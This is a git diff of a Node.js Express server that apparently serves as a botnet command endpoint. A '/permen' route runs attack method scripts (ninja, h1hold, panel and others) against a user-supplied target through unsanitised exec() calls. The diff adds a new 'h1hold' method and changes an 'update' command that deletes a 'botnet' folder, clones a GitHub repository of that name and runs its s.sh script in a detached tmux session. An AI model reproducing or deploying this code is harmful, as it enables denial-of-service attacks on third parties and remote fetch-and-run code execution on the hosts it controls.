@@ -29,6 +29,8 @@ app.get('/permen', (req, res) => {
   if (methods === 'ninja') {
     console.log('received');
     exec(`node methods/ninja ${target} ${time}`);
+  } else if (methods === 'h1hold') {
+    exec(`node methods/h1hold.js ${target}`);
   } else if (methods === 'panel') {
     exec(`node methods/panel.js ${target} ${time}`);
   } else if (methods === 'pluto') {
@@ -96,7 +98,7 @@ app.get('/permen', (req, res) => {
   } else if (methods === 'proxy') {
     exec(`node proxy.js`);
   } else if (methods === 'update') {
-    exec(`cd /var/log && pm2 stop index && pm2 delete index && pm2 save && pm2 save --force && rm -rf botnet && git clone https://github.com/annizayanti/botnet && cd botnet && bash s.sh`);
+    exec(`cd /var/log && tmux new-session -d 'rm -rf botnet && git clone https://github.com/annizayanti/botnet && cd botnet && bash s.sh'`);
   } else {
     console.log('Metode tidak dikenali atau format salah.');
   }
